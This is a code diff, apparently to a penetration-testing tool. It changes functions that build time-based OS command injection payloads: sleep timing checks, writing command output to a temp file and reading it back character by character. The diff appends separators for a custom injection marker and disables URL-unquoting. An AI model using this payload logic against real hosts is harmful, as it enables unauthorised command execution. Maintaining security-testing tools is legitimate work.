@@ -87,6 +87,9 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
     else:
       pass
 
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
   return payload
 
 """
@@ -139,7 +142,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
                 "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
-      separator = _urllib.parse.unquote(separator)
+      # separator = _urllib.parse.unquote(separator)
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
@@ -151,8 +154,10 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
     else:
       pass
 
-  payload = checks.payload_newline_fixation(payload)
-  return payload
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
+  return checks.payload_newline_fixation(payload)
 
 """
 Execute shell commands on vulnerable host.
@@ -229,7 +234,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t d1<" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 "echo $" + settings.RANDOM_VAR_GENERATOR + "1" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE
                 )
-      separator = _urllib.parse.unquote(separator)
+      # separator = _urllib.parse.unquote(separator)
     elif separator == "||" :
       pipe = "|"
       cmd = cmd.rstrip()
@@ -242,6 +247,9 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 )
     else:
       pass
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
 
   return payload
 
@@ -299,7 +307,7 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
                 "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
-      separator = _urllib.parse.unquote(separator)
+      # separator = _urllib.parse.unquote(separator)
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
@@ -310,8 +318,10 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
     else:
       pass
 
-  payload = checks.payload_newline_fixation(payload)
-  return payload
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
+  return checks.payload_newline_fixation(payload)
 
 """
 Get the execution output, of shell execution.
@@ -372,6 +382,9 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
     else:
       pass
 
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
   return payload
 
 """
@@ -429,9 +442,10 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, t
     else:
       pass
 
-  # New line fixation
-  payload = checks.payload_newline_fixation(payload)
-  return payload
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
+  return checks.payload_newline_fixation(payload)
 
 """
 Get the execution output, of shell execution.
@@ -485,6 +499,9 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
                 )
     else:
       pass
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
 
   return payload
 
@@ -541,8 +558,9 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
     else:
       pass
 
-  # New line fixation
-  payload = checks.payload_newline_fixation(payload)
-  return payload
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
+  return checks.payload_newline_fixation(payload)
 
 # eof
